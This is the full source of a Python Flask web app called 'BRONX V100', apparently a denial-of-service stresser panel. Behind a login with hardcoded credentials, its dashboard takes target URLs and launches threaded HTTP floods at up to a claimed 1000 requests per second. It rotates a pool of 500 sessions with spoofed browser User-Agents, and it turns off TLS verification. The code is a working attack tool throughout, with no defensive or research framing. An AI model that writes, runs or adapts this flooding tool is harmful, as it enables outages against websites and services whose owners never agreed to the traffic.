from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import urllib3
import json
import os
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ========== ATTACK SYSTEM ==========
active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
total_lifetime = {"success": 0, "failed": 0, "total": 0}
rate_limit_config = {"enabled": False, "rpm": 15}

# ========== MULTI-SESSION SYSTEM ==========
multi_session_config = {
    "enabled": False,
    "max_sessions": 500,
    "active_sessions": 0,
    "session_pool": [],
    "device_list": []
}

def create_session_pool():
    sessions = []
    for i in range(multi_session_config["max_sessions"]):
        s = requests.Session()
        s.headers.update({
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{120+i%10}.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        })
        sessions.append(s)
    return sessions

def get_multi_session():
    if not multi_session_config["session_pool"]:
        multi_session_config["session_pool"] = create_session_pool()
    return random.choice(multi_session_config["session_pool"])

# ========== SPEED CONFIG ==========
SPEEDS = {
    "slow": {"rate": 2, "delay": 0.2, "workers": 5},
    "fast": {"rate": 5, "delay": 0.15, "workers": 15},
    "veryfast": {"rate": 10, "delay": 0.1, "workers": 30},
    "ultra": {"rate": 50, "delay": 0.05, "workers": 80},
    "lightning": {"rate": 100, "delay": 0.02, "workers": 150},
    "flash": {"rate": 500, "delay": 0.001, "workers": 300},
    "god": {"rate": 1000, "delay": 0.0005, "workers": 500}
}

# ========== LOGIN PAGE ==========
LOGIN_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V100</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif}
.box{background:rgba(5,0,10,0.97);padding:50px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:420px;text-align:center;box-shadow:0 0 100px rgba(255,0,85,0.15)}
.logo{font-size:4em} h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.tag{color:#666;font-size:0.7em;letter-spacing:5px;margin:10px 0}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;margin:10px 0;font-size:15px}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.7);transform:translateY(-3px)}
</style></head><body>
<div class="box"><div class="logo">💀</div><h1>BRONX V100</h1><div class="tag">MULTI-SESSION GOD</div>
<p style="color:#555;font-size:0.6em;letter-spacing:2px">500 Sessions • 1000 RPS • ON/OFF Control</p>
<form method="post"><input type="text" name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><button class="btn" type="submit">☠️ ACCESS</button></form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}</div></body></html>"""

# ========== DASHBOARD ==========
DASH_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V100</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:system-ui,sans-serif;padding:20px}
.container{max-width:1400px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 30px;border:1px solid rgba(255,255,255,0.06);border-radius:16px;margin-bottom:20px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:15px}
.header h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:20px;text-align:center;transition:0.3s}
.stat:hover{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2)}
.stat-val{font-size:2.5em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}.b{color:#00c8ff}
.stat-label{font-size:0.6em;text-transform:uppercase;letter-spacing:3px;color:#555;margin-top:5px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(380px,1fr));gap:16px;margin-bottom:20px}
.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:24px}
.card h3{font-size:0.75em;font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-bottom:16px;color:#666}
input,select,textarea{width:100%;padding:12px 15px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#fff;margin:5px 0;font-size:13px;font-family:inherit;resize:vertical}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.15);outline:none}
label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#555;display:block;margin-top:10px}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.75em;letter-spacing:2px;margin:5px 0}
.btn:hover{box-shadow:0 0 40px rgba(255,0,85,0.5);transform:translateY(-2px)}
.btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.1)}
.btn-success{background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:15px;max-height:300px;overflow:auto;font-size:0.7em;font-family:monospace;color:#00ff88}
.log-e{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.4}}
.toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
.toggle{width:44px;height:24px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.4)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
.footer{text-align:center;padding:20px;color:rgba(255,255,255,0.15);font-size:0.6em;letter-spacing:3px}
.session-info{display:flex;justify-content:space-between;align-items:center;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;margin:8px 0}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>BRONX V100</h1><div style="color:#555;font-size:0.6em;letter-spacing:3px">MULTI-SESSION GOD • 500 SESSIONS • ON/OFF</div></div>
<div style="display:flex;gap:10px;align-items:center">
<span style="color:#666;font-size:0.6em" id="liveTime"></span>
<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.7em;letter-spacing:2px">DISCONNECT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Session Total</div></div>
<div class="stat"><div class="stat-val b" id="activeSessions">0</div><div class="stat-label">🔗 Active Sessions</div></div>
</div>

<div class="stats" style="grid-template-columns:repeat(2,1fr)">
<div class="stat"><div class="stat-val t" id="ltSuccess">0</div><div class="stat-label">🏆 Lifetime Success</div></div>
<div class="stat"><div class="stat-val t" id="ltTotal">0</div><div class="stat-label">📊 Lifetime Total</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK CONFIG</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="3" placeholder="https://api1.com&#10;https://api2.com"></textarea>
<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="5000"></div><div>
<label>Speed Mode</label><select id="speed">
<option value="slow">🐢 Slow (2/s)</option><option value="fast">⚡ Fast (5/s)</option>
<option value="veryfast">🔥 Very Fast (10/s)</option><option value="ultra">💀 Ultra (50/s)</option>
<option value="lightning">⚡ Lightning (100/s)</option><option value="flash" selected>💎 FLASH (500/s)</option>
<option value="god">👑 GOD (1000/s)</option>
</select></div></div>
<button class="btn" onclick="start()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-danger" onclick="stop()">⏹️ TERMINATE</button>
<div id="status" style="margin-top:8px"></div>
</div>

<div class="card">
<h3>🔗 MULTI-SESSION CONTROL</h3>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Multi-Session</span><div class="toggle" id="multiToggle" onclick="toggleMulti()"></div><span id="multiLabel" style="font-size:0.7em;color:#666">OFF</span></div>
<label>Max Sessions (10-500)</label><input type="number" id="maxSessions" value="500" min="10" max="500">
<div class="session-info"><span style="color:#888;font-size:0.7em">Active Sessions:</span><span style="color:#00c8ff;font-weight:bold" id="sessionCount">0</span></div>
<button class="btn btn-success" onclick="saveMultiConfig()">💾 SAVE CONFIG</button>
<button class="btn btn-secondary" onclick="resetSessions()">🔄 RESET SESSIONS</button>
</div>

<div class="card">
<h3>⚙️ RATE LIMITER</h3>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Rate Limiter</span><div class="toggle" id="rateToggle" onclick="toggleRate()"></div><span id="rateLabel" style="font-size:0.7em;color:#666">OFF</span></div>
<label>RPM</label><input type="number" id="rpm" value="15">
<button class="btn btn-secondary" onclick="saveRate()">💾 SAVE</button>
</div>

<div class="card">
<h3>📊 QUICK ACTIONS</h3>
<button class="btn btn-danger" onclick="resetStats()">🔄 RESET SESSION STATS</button>
<button class="btn btn-secondary" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
</div>
</div>

<div class="card"><h3>📜 BATTLE LOGS</h3><div class="logs" id="logs"><div class="log-e">System ready. V100 Multi-Session Active.</div></div></div>
<div class="footer">💀 BRONX V100 • MULTI-SESSION GOD • 500 SESSIONS 💀</div>
</div>

<script>
let multiOn=false,rateOn=false;
function toggleMulti(){multiOn=!multiOn;document.getElementById('multiToggle').classList.toggle('on',multiOn);document.getElementById('multiLabel').textContent=multiOn?'ON':'OFF'}
function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
function saveMultiConfig(){let max=document.getElementById('maxSessions').value;fetch('/multi_config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,max_sessions:parseInt(max)})}).then(r=>r.json()).then(d=>alert(d.status))}
function saveRate(){let rpm=document.getElementById('rpm').value;fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(rpm)})})}
function resetSessions(){fetch('/reset_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('sessionCount').textContent='0';u()})}
function resetStats(){fetch('/reset',{method:'POST'}).then(()=>u())}
function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>l())}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total;document.getElementById('ltSuccess').textContent=d.lt_success;document.getElementById('ltTotal').textContent=d.lt_total;document.getElementById('activeSessions').textContent=d.active_sessions||0;document.getElementById('sessionCount').textContent=d.active_sessions||0})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function start(){var urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());var count=document.getElementById('count').value;var speed=document.getElementById('speed').value;if(urls.length==0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:urls,count:parseInt(count),speed:speed,multi:multiOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1500)
</script></body></html>"""

# ========== ATTACK ENGINE (MULTI-SESSION) ==========
def attack_worker_multi(attack_id, url, count, delay, use_multi):
    for i in range(count):
        if attack_id not in active_attacks: break
        try:
            if use_multi and multi_session_config["enabled"]:
                session = get_multi_session()
            else:
                session = requests.Session()
                session.headers.update({"User-Agent": "Mozilla/5.0"})
            
            resp = session.get(url, timeout=5, verify=False)
            with threading.Lock():
                if resp.status_code < 500:
                    attack_stats["success"] += 1; total_lifetime["success"] += 1
                else:
                    attack_stats["failed"] += 1; total_lifetime["failed"] += 1
                attack_stats["total"] += 1; total_lifetime["total"] += 1
                multi_session_config["active_sessions"] = len(active_attacks)
        except:
            with threading.Lock():
                attack_stats["failed"] += 1; total_lifetime["failed"] += 1
                attack_stats["total"] += 1; total_lifetime["total"] += 1
        
        if delay > 0: time.sleep(delay)

def run_attack(attack_id, urls, count, speed, use_multi):
    config = SPEEDS.get(speed, SPEEDS["flash"])
    workers = min(config["workers"], 500 if use_multi else 100)
    with ThreadPoolExecutor(max_workers=workers) as executor:
        for url in urls:
            per_worker = max(1, count // workers)
            for _ in range(max(1, workers // len(urls))):
                executor.submit(attack_worker_multi, attack_id, url, per_worker, config["delay"], use_multi)
    if attack_id in active_attacks: del active_attacks[attack_id]
    multi_session_config["active_sessions"] = len(active_attacks)

# ========== ROUTES ==========
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            resp = make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
            return resp
        return render_template_string(LOGIN_HTML, error="Access Denied")
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH_HTML)

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',1000)),100000)
    speed = d.get('speed','flash')
    use_multi = d.get('multi',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | Multi: {'ON' if use_multi else 'OFF'}")
    
    t = threading.Thread(target=run_attack, args=(aid,urls,count,speed,use_multi))
    t.daemon=True; t.start()
    return jsonify({"status":"started","multi":use_multi})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    multi_session_config["active_sessions"] = 0
    return jsonify({"status":"stopped"})

@app.route('/reset', methods=['POST'])
def reset():
    attack_stats["success"] = attack_stats["failed"] = attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_sessions', methods=['POST'])
def reset_sessions():
    multi_session_config["session_pool"] = []
    multi_session_config["active_sessions"] = 0
    return jsonify({"status":"sessions_reset"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    attack_logs.clear()
    return jsonify({"status":"cleared"})

@app.route('/multi_config', methods=['POST'])
def multi_config():
    d = request.get_json()
    multi_session_config["enabled"] = d.get('enabled',False)
    multi_session_config["max_sessions"] = min(int(d.get('max_sessions',500)),500)
    if multi_session_config["enabled"]:
        multi_session_config["session_pool"] = create_session_pool()
    return jsonify({"status":"saved","sessions":multi_session_config["max_sessions"]})

@app.route('/rate', methods=['POST'])
def save_rate():
    d = request.get_json()
    rate_limit_config["enabled"] = d.get('enabled',False)
    rate_limit_config["rpm"] = d.get('rpm',15)
    return jsonify({"status":"saved"})

@app.route('/logs')
def logs(): 
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): 
    return jsonify({
        **attack_stats,
        "lt_success":total_lifetime["success"],
        "lt_total":total_lifetime["total"],
        "active_sessions":multi_session_config["active_sessions"]
    })

@app.route('/logout')
def logout(): 
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
